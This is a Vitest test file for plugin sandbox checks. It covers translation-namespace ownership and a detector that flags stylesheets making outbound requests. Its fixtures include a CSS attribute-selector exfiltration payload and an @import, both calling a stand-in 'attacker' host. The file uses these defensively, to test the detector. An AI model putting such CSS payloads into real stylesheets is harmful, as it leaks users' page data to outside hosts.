import { describe, expect, it } from "vitest";
import { cssReachesOutside, ownsTranslationNamespace } from "./pluginNamespace";

describe("ownsTranslationNamespace", () => {
  it("accepts the plugin's id and namespaces it prefixes", () => {
    expect(ownsTranslationNamespace("com.x.demo", "com.x.demo")).toBe(true);
    expect(ownsTranslationNamespace("com.x.demo", "com.x.demo.panel")).toBe(true);
    expect(ownsTranslationNamespace("com.x.demo", "com.x.demo:panel")).toBe(true);
  });

  it("refuses the app's namespaces and another plugin's", () => {
    for (const ns of ["plugins", "common", "menu", "com.x.demoid", "com.x", "", "com.x.other"]) {
      expect(ownsTranslationNamespace("com.x.demo", ns), ns).toBe(false);
    }
  });
});

describe("cssReachesOutside", () => {
  it("flags requests a stylesheet would make", () => {
    for (const css of [
      'a[href^="https://internal"]{background:url(https://attacker/l?a)}',
      "body{background: URL( 'x.png' )}",
      "body{background:image-set('a.png' 1x)}",
      '@import "https://attacker/x.css";',
      "@IMPORT url(x.css);",
    ]) {
      expect(cssReachesOutside(css), css).toBe(true);
    }
  });

  it("passes plain styling through", () => {
    for (const css of [
      "body{color:red}",
      ".x{content:'url'}",
      ".curl{margin:0}",
      ".import-button{display:none}",
    ]) {
      expect(cssReachesOutside(css), css).toBe(false);
    }
  });
});
